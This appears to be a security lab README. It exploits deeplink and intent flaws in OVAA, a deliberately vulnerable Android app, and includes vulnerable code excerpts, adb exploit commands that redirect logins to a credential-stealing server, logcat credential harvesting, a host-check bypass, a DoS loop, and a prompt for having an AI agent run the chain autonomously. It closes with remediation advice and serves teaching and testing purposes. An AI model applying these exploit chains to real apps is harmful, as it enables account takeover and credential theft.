# OVAA - AI-Driven Deeplink Exploitation & Account Takeover

## Lab Overview

**Target**: OVAA (Oversecured Vulnerable Android App)  
**Attack Type**: Deeplink / Inter-Component Communication (ICC) Exploitation  
**Impact**: Account Takeover, Credential Theft, Activity Hijacking, DoS

---

## Table of Contents

1. [Environment Setup](#environment-setup)
2. [Architecture & Vulnerability Analysis](#architecture--vulnerability-analysis)
3. [Test Scenarios (TC01-TC05)](#test-scenarios)
4. [Exploitation Guide](#exploitation-guide)
5. [Attacker Server & Web Interface](#attacker-server--web-interface)
6. [Digital Evidence Collection](#digital-evidence-collection)
7. [Maestro Automation](#maestro-automation)
8. [OpenCode Agent Workflow](#opencode-agent-workflow)
9. [AI Agent Prompt (prompt.txt)](#ai-agent-prompt-prompttxt)
10. [Full Findings Report](#full-findings-report)

---

## Environment Setup

### Dependencies

| Component   | Version       | Purpose                          |
|-------------|---------------|----------------------------------|
| JDK         | 17+ (21 used) | APK compilation                  |
| Android SDK | 34+ (36 used) | Build tools, platform            |
| ADB         | latest        | Device communication             |
| Maestro CLI | 2.6+          | UI test automation               |
| OpenCode    | 1.17+         | Investigative agent orchestrator |

### Quick Setup

```bash
# 1. Clone repository
cd /tmp && git clone https://github.com/oversecured/ovaa.git && cd ovaa

# 2. Configure SDK
echo "sdk.dir=$ANDROID_SDK_ROOT" > local.properties

# 3. Accept licenses
$ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager --licenses

# 4. Build
export JAVA_HOME=/usr/lib/jvm/java-21-openjdk-amd64
chmod +x gradlew && ./gradlew assembleDebug --no-daemon

# 5. Install
adb install app/build/outputs/apk/debug/app-debug.apk

# 6. Verify
adb shell pm list packages | grep ovaa
adb shell monkey -p oversecured.ovaa -c android.intent.category.LAUNCHER 1
```

---

## Architecture & Vulnerability Analysis

### Manifest Analysis (`AndroidManifest.xml`)

```
Exported components:
├── DeeplinkActivity   (exported=true) ← Deeplink handler
├── LoginActivity      (exported=true) ← Redirect intent
├── MainActivity       (exported=true) ← Direct launch possible
├── InsecureLoggerService (exported=true) ← Log dump
└── TheftOverwriteProvider (exported=true) ← Arbitrary file write
```

### Root Cause per Vulnerability

#### TC01 - Arbitrary login_url Injection (`DeeplinkActivity.java:35-39`)
```java
} else if("/login".equals(path)) {
    String url = uri.getQueryParameter("url");
    if (url != null) {
        loginUtils.setLoginUrl(url);  // NO VALIDATION!
    }
    startActivity(new Intent(this, EntranceActivity.class));
}
```
**No validation on `url` parameter** → any URL can be set as login endpoint.

#### TC02 - WebView Host Validation Bypass (`DeeplinkActivity.java:46-55`)
```java
} else if("/webview".equals(path)) {
    String url = uri.getQueryParameter("url");
    if (url != null) {
        String host = Uri.parse(url).getHost();
        if (host != null && host.endsWith("example.com")) {  // WEAK CHECK!
            Intent i = new Intent(this, WebViewActivity.class);
            i.putExtra("url", url);
            startActivity(i);
        }
    }
}
```
**`host.endsWith("example.com")`** → `evil.com.example.com` bypasses validation.

#### TC03 - Credential Leakage (`LoginActivity.java:59`)
```java
private void processLogin(String email, String password) {
    LoginData loginData = new LoginData(email, password);
    Log.d("ovaa", "Processing " + loginData);  // CREDENTIALS IN LOGCAT!
    // ...
}
```
**Plaintext credentials in system log** → readable via `adb logcat`.

#### TC04 - Arbitrary Activity Launch (`LoginActivity.java:23,76-83`)
```java
public static final String INTENT_REDIRECT_KEY = "redirect_intent";
// ...
Intent redirectIntent = getIntent().getParcelableExtra(INTENT_REDIRECT_KEY);
if (redirectIntent != null) {
    startActivity(redirectIntent);  // NO VALIDATION!
}
```
**Arbitrary Intent redirect** → any activity can be launched post-login.

---

## Test Scenarios

### TC01: Arbitrary login_url Injection → Credential Theft via Network

**Attack Flow:**
```
[1] Attacker sends deeplink:
    oversecured://ovaa/login?url=http://attacker.com:8080/steal
    
[2] login_url stored in SharedPreferences:
    <string name="login_url">http://attacker.com:8080/steal</string>
    
[3] User logs in with credentials
    
[4] App POSTs credentials to attacker's server:
    POST http://attacker.com:8080/steal
    Body: {"email":"victim@company.com","password":"SuperSecret123!"}
```

**Exploit Command:**
```bash
adb shell am start -a android.intent.action.VIEW \
  -d "oversecured://ovaa/login?url=http://10.0.2.2:8080/steal" \
  oversecured.ovaa
```

**Evidence - SharedPreferences after injection:**
```xml
<map>
    <string name="login_url">http://10.0.2.2:8080/steal</string>
</map>
```

### TC02: WebView Host Validation Bypass

**Attack Flow:**
```
[1] Attacker sends deeplink:
    oversecured://ovaa/webview?url=https://evil.com.example.com/steal
    
[2] Host validation: evil.com.example.com ENDS WITH example.com → TRUE
    
[3] WebView loads attacker's JavaScript:
    - JS enabled (setJavaScriptEnabled=true)
    - File access from file:// URLs enabled
    - Can exfiltrate local files
```

**Exploit Command:**
```bash
adb shell am start -a android.intent.action.VIEW \
  -d "oversecured://ovaa/webview?url=https://evil.com.example.com/steal" \
  oversecured.ovaa
```

### TC03: Credential Leakage via Logcat

**Exploit Command:**
```bash
adb logcat -d | grep -E "Processing"
```

**Evidence Output:**
```
D/ovaa (6441): Processing victim@company.com:SuperSecret123!
```

### TC04: Arbitrary Activity Launch

**Exploit Commands:**
```bash
# Direct launch of exported activities
adb shell am start -a oversecured.ovaa.action.ACTIVITY_MAIN oversecured.ovaa
adb shell am start -a oversecured.ovaa.action.LOGIN oversecured.ovaa
```

### TC05: State Inconsistency / DoS

**Attack:**
```bash
# Rapid sequential deeplinks → state corruption
for i in {1..5}; do
    adb shell am start -a android.intent.action.VIEW \
      -d "oversecured://ovaa/logout" oversecured.ovaa
    adb shell am start -a android.intent.action.VIEW \
      -d "oversecured://ovaa/login?url=http://evil.com/" oversecured.ovaa
done
```

---

## Exploitation Guide

### Full Attack Chain (Automated)

```bash
# Terminal 1: Start attacker server
python3 steal_server.py

# Terminal 2: Run exploit
./full_exploit.sh
```

### Manual Step-by-Step

**Step 1: Start Attacker Server**
```bash
nohup python3 steal_server.py > /tmp/steal_srv.log 2>&1 &
```

**Step 2: Inject Deeplink (Clear state + set malicious login_url)**
```bash
adb shell pm clear oversecured.ovaa
adb shell am start -a android.intent.action.VIEW \
  -d "oversecured://ovaa/login?url=http://10.0.2.2:8080/steal" \
  oversecured.ovaa
```

**Step 3: Login with Victim Credentials**
```bash
# Launch app
adb shell monkey -p oversecured.ovaa -c android.intent.category.LAUNCHER 1

# Input email (victim@company.com)
adb shell input tap 710 479; sleep 0.3
adb shell input text "victim"; adb shell input keyevent 77
adb shell input text "company"; adb shell input keyevent 56
adb shell input text "com"

# Input password (SuperSecret123!)
adb shell input tap 710 660; sleep 0.3
adb shell input text "SuperSecret123"
adb shell input text '\!'

# Close keyboard + click LOGIN
adb shell input keyevent 4; sleep 1.5
adb shell input tap 540 2096
```

**Step 4: Verify Captured Credentials**
```bash
# Network capture
cat /tmp/steal_srv.log

# Logcat evidence
adb logcat -d | grep "Processing"

# SharedPreferences
adb shell su root cat /data/data/oversecured.ovaa/shared_prefs/login_data.xml
```

---

## Digital Evidence Collection

### Evidence-1: SharedPreferences Manipulation
```bash
adb shell su root cat /data/data/oversecured.ovaa/shared_prefs/login_data.xml
```
**Expected Output:**
```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="login_url">http://10.0.2.2:8080/steal</string>
    <string name="password">SuperSecret123!</string>
    <string name="email">victim@company.com</string>
</map>
```

### Evidence-2: Logcat Credential Leakage
```bash
adb logcat -d | grep -E "ovaa|Processing"
```
**Expected Output:**
```
D/ovaa (6441): Processing victim@company.com:SuperSecret123!
```

---

## Attacker Server & Web Interface

### steal_server.py

The attacker server is a Python HTTP server that:
1. **Captures** POST requests from OVAA's Retrofit at `/steal`
2. **Logs** credentials to console and `evidence/captured_credentials.txt`
3. **Displays** captured credentials via web interface at `/view`

### Starting the Server

```bash
# Foreground
python3 steal_server.py

# Background
nohup python3 steal_server.py > /tmp/steal.log 2>&1 &
```

### Endpoints

| Method | Path    | Description                                    |
|--------|---------|------------------------------------------------|
| POST   | /steal  | Capture credentials (called by OVAA Retrofit)   |
| GET    | /view   | **Web interface** displaying captured creds     |
| GET    | /steal  | Status check (returns "POST your creds here")   |

### Viewing Captured Credentials

**Via web browser** (terminal-based):
```bash
curl http://127.0.0.1:8080/view
```

**Output:**
```
[!] OVAA Steal Server - Captured Credentials
Listening on port 8080

[2026-07-13 06:23:33] 127.0.0.1
  email:    victim@company.com
  password: SuperSecret123!
  raw:      {"email":"victim@company.com","password":"SuperSecret123!"}
```

### How the Network Attack Works

```
┌────────────────────┐         POST /steal          ┌─────────────────────┐
│   OVAA App         │ ─────────────────────────────▶│  Attacker Server    │
│   (Emulator)       │   {"email":"victim@...",      │  (Host:8080)        │
│                    │    "password":"Super..."}     │                     │
│                    │                               │  Saved to:          │
│  login_url =       │                               │  evidence/          │
│  http://10.0.2.2   │                               │  captured_creds.txt │
│  :8080/steal       │                               │                     │
└────────────────────┘                               │  View at:           │
                                                      │  /view endpoint     │
                                                      └─────────────────────┘
```

**Note**: `10.0.2.2` is the Android emulator's alias for the host machine's `127.0.0.1`.

### Cleartext Traffic Consideration

Android API 28+ blocks HTTP cleartext traffic by default for apps targeting API 28+.
OVAA targets API 36 and does **NOT** set `android:usesCleartextTraffic="true"`.

- Without the flag: POST to `http://...` is **blocked** (credentials captured only via logcat)
- With the flag: POST reaches the attacker server (full network capture)

The `setup_environment.sh` script automatically adds this flag. In a real attack scenario,
the attacker would use an HTTPS endpoint to bypass this protection.

### Evidence-3: Network Credential Capture (Web Interface)
```bash
curl http://127.0.0.1:8080/view
```
**Expected Output:**
```
[2026-07-13 06:23:33] 127.0.0.1
  email:    victim@company.com
  password: SuperSecret123!
  raw:      {"email":"victim@company.com","password":"SuperSecret123!"}
```

### Evidence-4: Network Credential Capture (File)
```bash
cat evidence/captured_credentials.txt
```

---

## Maestro Automation

### Run Login Flow
```bash
maestro test ovaa_login_maestro.yaml
```

### Run with Debug Output
```bash
maestro test ovaa_login_maestro.yaml --debug-output /tmp/maestro_debug
```

### Maestro YAML Structure
```yaml
appId: oversecured.ovaa
---
- launchApp:
    clearState: true
- extendedWaitUntil:
    visible:
      text: "Welcome to Oversecured!"
    timeout: 10000
- takeScreenshot: screenshot_01.png
- tapOn:
    id: "oversecured.ovaa:id/emailView"
- inputText: "victim@company.com"
- takeScreenshot: screenshot_02.png
# ... (see ovaa_login_maestro.yaml for full script)
```

---

## OpenCode Agent Workflow

### Investigation Flow
```
┌──────────────────────────────────────────────────────┐
│                  OpenCode Agent (Analyst)             │
│                                                      │
│  ┌─────────────────┐    ┌─────────────────────────┐  │
│  │ Analyze Source   │───▶│ Identify Vulnerabilities │  │
│  │ (AndroidManifest │    │ (DeeplinkActivity,      │  │
│  │  + Java source)  │    │  LoginActivity, etc.)   │  │
│  └─────────────────┘    └───────────┬─────────────┘  │
│                                      │                │
│                                      ▼                │
│  ┌─────────────────┐    ┌─────────────────────────┐  │
│  │ Generate Proof   │◀───│ Craft Exploit Payloads  │  │
│  │ (Report +        │    │ (adb intents, deeplinks)│  │
│  │  Evidence)       │    └───────────┬─────────────┘  │
│  └─────────────────┘                │                │
│                                      │                │
└──────────────────────────────────────┼────────────────┘
                                       │
                      ┌────────────────▼────────────────┐
                      │     Maestro CLI (Executor)       │
                      │                                  │
                      │  • Runs YAML test flows          │
                      │  • Takes screenshots             │
                      │  • Validates UI assertions       │
                      └──────────────────────────────────┘
```

### Agent Prompt Template
```
Buatkan berkas skrip Maestro YAML untuk otomatisasi login 
pada aplikasi oversecured.ovaa. 

Skrip harus:
1. Memasukkan email: victim@company.com
2. Memasukkan password: SuperSecret123!
3. Mengklik tombol login
4. Mengambil screenshot pada tiap langkah
```

---

## AI Agent Prompt (prompt.txt)

A single comprehensive prompt for running the **entire lab autonomously** via any AI coding agent (OpenCode, Claude Code, etc.).

```bash
# Load the full prompt
cat prompt.txt
```

The prompt covers all 10 stages:
1. Environment setup & OVAA build
2. Start attacker server with web interface
3. TC01: login_url injection
4. TC02: WebView host validation bypass
5. TC03: Credential leakage + network capture
6. TC04: Arbitrary activity launch
7. TC05: State inconsistency / DoS
8. Digital evidence collection (all 3 vectors)
9. Report generation
10. Final verification

**Usage**: Copy the content of `prompt.txt` and paste it into your AI agent.
The agent will execute the entire lab end-to-end.

---

---

## Full Findings Report

### Summary

| ID   | Vulnerability                         | CVSS | Status    |
|------|---------------------------------------|------|-----------|
| TC01 | Arbitrary login_url Injection         | 9.8  | VALIDATED |
| TC02 | WebView Host Validation Bypass        | 8.2  | VALIDATED |
| TC03 | Credential Leakage (logcat)           | 7.5  | VALIDATED |
| TC04 | Arbitrary Activity Launch             | 7.8  | VALIDATED |
| TC05 | State Inconsistency / DoS             | 5.3  | VALIDATED |

### Key Findings
1. **login_url** parameter in deeplink handler has zero validation → ATO via credential exfiltration
2. Host validation uses weak `String.endsWith()` → trivial bypass with `evil.com.example.com`
3. `Log.d()` prints plaintext credentials → system log leakage (3 vectors: logcat + SharedPrefs + network)
4. `redirect_intent` accepts arbitrary Parcelable Intent → activity hijacking
5. Exported activities allow direct launch without authentication
6. WebView configured with `setJavaScriptEnabled(true)` + `setAllowFileAccessFromFileURLs(true)` → file theft

### Remediation
1. Validate `login_url` against a whitelist of allowed endpoints
2. Use `Uri.getHost()` with exact match (not `endsWith`) + enforce HTTPS
3. Remove `Log.d()` calls that log sensitive data (use ProGuard/R8 stripping)
4. Validate `redirect_intent` against allowed package/component whitelist
5. Set `android:exported="false"` on non-public components
6. Add `network_security_config.xml` to enforce HTTPS
7. Implement deeplink verification via `IntentUtil.verifyDeeplink()`
8. Disable `setAllowFileAccessFromFileURLs` and `setJavaScriptEnabled` unless explicitely needed
9. Encrypt SharedPreferences with EncryptedSharedPreferences (AndroidX Security)

---

## File Inventory

```
/home/d4x13/Documents/MYPROJECT/TOOLS/userfull-mobile/Deeplink/
├── prompt.txt                     # ★ SINGLE AI AGENT PROMPT (run entire lab)
├── SKILL.md                       # Skill definition + metadata + usage
├── README.md                      # Full lab documentation (English) <-- ANDA DI SINI
├── LAPORAN_EKSPLOITASI_OVAA.txt   # Complete report (Bahasa Indonesia)
├── ovaa_login_maestro.yaml        # Maestro YAML automation for login
├── steal_server.py                # Attacker HTTP server + web interface (/view)
├── full_exploit.sh                # Full exploit chain (TC01-TC05)
├── setup_environment.sh           # Environment setup + build + install + cleartext patch
├── exploiter_agent.txt            # Multi-prompt templates for OpenCode agent
└── evidence/                      # Digital evidence
    ├── 01_login_screen.png
    ├── 02_email_entered.png
    ├── 03_password_entered.png
    ├── 03b_keyboard_closed.png
    ├── 04_logged_in_main.png
    └── captured_credentials.txt   # Network-captured credentials (auto-generated)
```
